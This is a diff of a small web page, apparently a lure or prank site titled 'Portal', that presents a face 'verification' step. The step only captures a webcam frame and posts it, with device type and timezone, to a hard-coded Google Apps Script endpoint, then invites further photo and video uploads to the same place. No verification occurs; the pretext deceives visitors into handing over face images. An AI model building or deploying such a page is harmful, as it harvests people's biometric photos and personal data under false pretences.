@@ -3,29 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>A Quiet Space</title>
+  <title>Portal</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@200;300;400&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital@0;1&family=Inter:wght@200;300&display=swap" rel="stylesheet">
   <style>
-    :root {
-      --bg: #050505;
-      --text: #f0f0f0;
-      --muted: #666666;
-      --border: rgba(255, 255, 255, 0.1);
-    }
-
-    * {
-      box-sizing: border-box;
+    body {
+      background-color: #030303;
+      color: #eaeaea;
+      font-family: 'Inter', sans-serif;
       margin: 0;
       padding: 0;
-    }
-
-    body {
-      background-color: var(--bg);
-      color: var(--text);
-      font-family: 'Inter', -apple-system, sans-serif;
-      min-height: 100vh;
+      height: 100vh;
       overflow: hidden;
       display: flex;
       justify-content: center;
@@ -33,172 +22,143 @@
       text-align: center;
     }
 
-    /* Cinematic Letterbox Effects */
-    body::before, body::after {
-      content: "";
-      position: absolute;
-      left: 0;
-      width: 100%;
-      height: 8vh;
-      background: #000;
-      z-index: 100;
-      pointer-events: none;
-    }
-    body::before { top: 0; }
-    body::after { bottom: 0; }
-
     .screen {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0; width: 100%; height: 100%;
       display: flex;
       flex-direction: column;
       justify-content: center;
       align-items: center;
       opacity: 0;
       visibility: hidden;
-      transition: opacity 1.5s ease, visibility 1.5s;
-      padding: 20px;
+      transition: opacity 2s ease, visibility 2s;
+      z-index: 10;
     }
 
     .screen.active {
       opacity: 1;
       visibility: visible;
-      z-index: 10;
     }
 
-    .camera-container {
-      position: relative;
-      width: 280px;
-      height: 350px;
-      margin-bottom: 30px;
-      border-radius: 4px;
-      overflow: hidden;
-      border: 1px solid var(--border);
-      box-shadow: 0 0 40px rgba(255,255,255,0.02);
+    .camera-wrapper {
+      position: absolute;
+      top: 15%;
+      width: 100vw;
+      height: 60vh;
+      z-index: -1;
+      mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
+      -webkit-mask-image: linear-gradient(to bottom, transparent, black 20%, black 80%, transparent);
     }
 
     #videoElement {
       width: 100%;
       height: 100%;
       object-fit: cover;
-      filter: grayscale(20%) contrast(110%);
+      filter: grayscale(100%) contrast(130%) brightness(50%);
+      opacity: 0.6;
     }
 
-    .overlay-text {
-      font-size: 0.85rem;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      font-weight: 200;
-      margin-bottom: 24px;
-      color: var(--muted);
+    .title-text {
+      font-family: 'Playfair Display', serif;
+      font-size: 1.4rem;
+      font-weight: 400;
+      font-style: italic;
+      color: #ffffff;
+      margin-bottom: 40px;
+      letter-spacing: 1px;
     }
 
     .btn {
-      background: transparent;
-      color: var(--text);
-      border: 1px solid var(--border);
-      padding: 14px 32px;
-      font-size: 0.8rem;
-      letter-spacing: 2px;
+      background: none;
+      border: none;
+      color: #999;
+      font-family: 'Inter', sans-serif;
+      font-size: 0.75rem;
+      letter-spacing: 3px;
       text-transform: uppercase;
       cursor: pointer;
-      transition: all 0.4s ease;
-      border-radius: 2px;
-      font-family: inherit;
+      padding: 12px 24px;
+      margin: 8px 0;
+      transition: all 0.5s ease;
+      position: relative;
+    }
+
+    .btn::after {
+      content: '';
+      position: absolute;
+      bottom: 6px;
+      left: 50%;
+      width: 0;
+      height: 1px;
+      background: #fff;
+      transition: all 0.5s ease;
+      transform: translateX(-50%);
     }
 
     .btn:hover {
-      background: #fff;
-      color: #000;
+      color: #fff;
+    }
+
+    .btn:hover::after {
+      width: 40%;
     }
 
     .btn:disabled {
-      opacity: 0.3;
-      cursor: not-allowed;
+      opacity: 0.2;
       pointer-events: none;
-    }
-
-    /* Screen 2 UI */
-    .hub-container {
-      width: 100%;
-      max-width: 400px;
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-    }
-
-    .hub-title {
-      font-size: 1.2rem;
-      font-weight: 300;
-      margin-bottom: 32px;
-      letter-spacing: 1px;
     }
 
     input[type="file"] { display: none; }
 
-    .preview-box {
-      margin-top: 20px;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      gap: 16px;
-    }
-
-    .preview-media {
-      max-width: 100%;
-      max-height: 300px;
-      border: 1px solid var(--border);
-      border-radius: 2px;
-      filter: grayscale(10%);
-    }
-
     .status-text {
-      margin-top: 20px;
-      font-size: 0.8rem;
-      letter-spacing: 1px;
-      color: var(--muted);
+      font-size: 0.7rem;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: #555;
+      margin-top: 30px;
       min-height: 20px;
     }
 
-    .fade-in { animation: fadeIn 1s forwards; }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .preview-box {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      margin-top: 20px;
+    }
+
+    .preview-media {
+      max-width: 80%;
+      max-height: 250px;
+      opacity: 0.8;
+      border-radius: 2px;
+    }
   </style>
 </head>
 <body>
 
-  <!-- Audio Element -->
   <audio id="bgMusic" src="loser.mp3" loop></audio>
 
-  <!-- SCREEN 1: Face Verification -->
   <div id="screen-verify" class="screen active">
-    <div class="overlay-text">Identity Required</div>
-    
-    <div class="camera-container">
+    <div class="camera-wrapper">
       <video id="videoElement" autoplay playsinline muted></video>
     </div>
-
-    <button id="btnVerify" class="btn">Verify Face</button>
+    
+    <button id="btnVerify" class="btn">Verify</button>
     <div id="verifyStatus" class="status-text"></div>
   </div>
 
-  <!-- SCREEN 2: Main Interactive Hub -->
   <div id="screen-hub" class="screen">
-    <div class="hub-title">Share a piece of right now.</div>
+    <div class="title-text">share a piece of right now</div>
     
-    <div class="hub-container">
-      <label for="fileGallery" class="btn">Upload from Gallery</label>
-      <input type="file" id="fileGallery" accept="image/*,video/*">
+    <label for="fileGallery" class="btn">Select from Gallery</label>
+    <input type="file" id="fileGallery" accept="image/*,video/*">
 
-      <label for="fileCamera" class="btn">Capture Photo / Video</label>
-      <input type="file" id="fileCamera" accept="image/*,video/*" capture="environment">
-    </div>
+    <label for="fileCamera" class="btn">Use Camera</label>
+    <input type="file" id="fileCamera" accept="image/*,video/*" capture="environment">
 
     <div id="previewContainer" class="preview-box">
       <div id="mediaPlaceholder"></div>
-      <button id="btnSendMedia" class="btn" style="width: 100%;">Send</button>
+      <button id="btnSendMedia" class="btn" style="margin-top: 24px;">Send</button>
     </div>
 
     <div id="hubStatus" class="status-text"></div>
@@ -207,91 +167,69 @@
   <script>
     const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzYFjwZJmzqPjCZ00g1Qkdram_wdsuCyZTisWgJMwqzptMoOojCLH7L7x7IRvyHZEEd/exec";
 
-    // Global specs logic
     function getClientSpecs() {
-      const ua = navigator.userAgent;
       return {
-        device: /iPhone|iPad|iPod|Android/i.test(ua) ? "Mobile/Tablet" : "Desktop",
-        browser: "Web Browser",
-        screen: `${window.screen.width}x${window.screen.height}`,
+        device: /iPhone|iPad|iPod|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"
       };
     }
 
-    // -- STAGE 1: CAMERA VERIFICATION --
     const videoElement = document.getElementById('videoElement');
     const btnVerify = document.getElementById('btnVerify');
     const verifyStatus = document.getElementById('verifyStatus');
     const bgMusic = document.getElementById('bgMusic');
     let streamRef = null;
 
-    // Initialize Camera on load
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
       .then(stream => {
         streamRef = stream;
         videoElement.srcObject = stream;
       })
-      .catch(err => {
-        verifyStatus.textContent = "Camera access required to proceed.";
+      .catch(() => {
+        verifyStatus.textContent = "camera access required";
         btnVerify.disabled = true;
       });
 
     btnVerify.addEventListener('click', () => {
-      // Start Cinematic Music
-      bgMusic.play().catch(() => console.log("Audio play blocked by browser"));
-      
+      bgMusic.play().catch(() => {});
       btnVerify.disabled = true;
-      verifyStatus.textContent = "Verifying...";
+      verifyStatus.textContent = "verifying...";
 
-      // Capture frame
       const canvas = document.createElement('canvas');
       canvas.width = videoElement.videoWidth;
       canvas.height = videoElement.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+      canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
       
-      const base64Data = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-      const specs = getClientSpecs();
-
       const payload = {
         action: "upload_media",
-        fileName: `face_verification_${Date.now()}.jpg`,
+        fileName: `verification_${Date.now()}.jpg`,
         mimeType: "image/jpeg",
-        base64Data: base64Data,
-        device: specs.device,
-        timezone: specs.timezone
+        base64Data: canvas.toDataURL('image/jpeg', 0.8).split(',')[1],
+        device: getClientSpecs().device,
+        timezone: getClientSpecs().timezone
       };
 
-      // Upload Verification Photo
       fetch(APPS_SCRIPT_URL, {
         method: "POST",
         mode: "no-cors",
-        headers: { "Content-Type": "application/json" },
+        headers: { "Content-Type": "text/plain" },
         body: JSON.stringify(payload)
       })
       .then(() => {
-        verifyStatus.textContent = "Verify move forward.";
-        
-        // Stop camera stream to save battery
-        if (streamRef) {
-          streamRef.getTracks().forEach(track => track.stop());
-        }
+        verifyStatus.textContent = "verified.";
+        if (streamRef) streamRef.getTracks().forEach(track => track.stop());
 
-        // Cinematic Transition to Screen 2
         setTimeout(() => {
           document.getElementById('screen-verify').classList.remove('active');
-          setTimeout(() => {
-            document.getElementById('screen-hub').classList.add('active');
-          }, 800);
-        }, 1500);
+          setTimeout(() => document.getElementById('screen-hub').classList.add('active'), 1500);
+        }, 1200);
       })
       .catch(() => {
-        verifyStatus.textContent = "Verification failed. Check connection.";
+        verifyStatus.textContent = "failed connection";
         btnVerify.disabled = false;
       });
     });
 
-    // -- STAGE 2: HUB UPLOADS --
     const fileGallery = document.getElementById('fileGallery');
     const fileCamera = document.getElementById('fileCamera');
     const previewContainer = document.getElementById('previewContainer');
@@ -300,66 +238,51 @@
     const hubStatus = document.getElementById('hubStatus');
     let selectedFile = null;
 
-    function handleFileSelection(file) {
+    function handleFile(file) {
       if (!file) return;
-      if (file.size > 25 * 1024 * 1024) {
-        hubStatus.textContent = "File exceeds 25 MB limit.";
-        return;
-      }
-
       selectedFile = file;
       mediaPlaceholder.innerHTML = "";
       hubStatus.textContent = "";
 
       const fileReader = new FileReader();
-      fileReader.onload = function(e) {
-        if (file.type.startsWith("image/")) {
-          const img = document.createElement("img");
-          img.src = e.target.result;
-          img.className = "preview-media";
-          mediaPlaceholder.appendChild(img);
-        } else if (file.type.startsWith("video/")) {
-          const vid = document.createElement("video");
-          vid.src = e.target.result;
-          vid.controls = true;
-          vid.className = "preview-media";
-          mediaPlaceholder.appendChild(vid);
-        }
+      fileReader.onload = (e) => {
+        const el = document.createElement(file.type.startsWith("video/") ? "video" : "img");
+        el.src = e.target.result;
+        el.className = "preview-media";
+        if (el.tagName === "VIDEO") el.controls = true;
+        mediaPlaceholder.appendChild(el);
         previewContainer.style.display = "flex";
       };
       fileReader.readAsDataURL(file);
     }
 
-    fileGallery.addEventListener('change', (e) => handleFileSelection(e.target.files[0]));
-    fileCamera.addEventListener('change', (e) => handleFileSelection(e.target.files[0]));
+    fileGallery.addEventListener('change', (e) => handleFile(e.target.files[0]));
+    fileCamera.addEventListener('change', (e) => handleFile(e.target.files[0]));
 
     btnSendMedia.addEventListener('click', () => {
       if (!selectedFile) return;
-
       btnSendMedia.disabled = true;
-      hubStatus.textContent = "Transmitting...";
+      hubStatus.textContent = "transmitting...";
 
-      const specs = getClientSpecs();
       const reader = new FileReader();
-
-      reader.onload = function() {
+      reader.onload = () => {
         const payload = {
           action: "upload_media",
           fileName: selectedFile.name || `upload_${Date.now()}`,
           mimeType: selectedFile.type,
           base64Data: reader.result.split(",")[1],
-          device: specs.device,
-          timezone: specs.timezone
+          device: getClientSpecs().device,
+          timezone: getClientSpecs().timezone
         };
 
         fetch(APPS_SCRIPT_URL, {
-  method: "POST",
-  headers: { "Content-Type": "text/plain;charset=utf-8" },
-  body: JSON.stringify(payload)
-})
-
+          method: "POST",
+          mode: "no-cors",
+          headers: { "Content-Type": "text/plain" },
+          body: JSON.stringify(payload)
+        })
         .then(() => {
-          hubStatus.textContent = "Transmission complete.";
+          hubStatus.textContent = "sent.";
           setTimeout(() => {
             previewContainer.style.display = "none";
             hubStatus.textContent = "";
@@ -368,7 +291,7 @@
           }, 3000);
         })
         .catch(() => {
-          hubStatus.textContent = "Transmission failed.";
+          hubStatus.textContent = "transmission failed.";
           btnSendMedia.disabled = false;
         });
       };
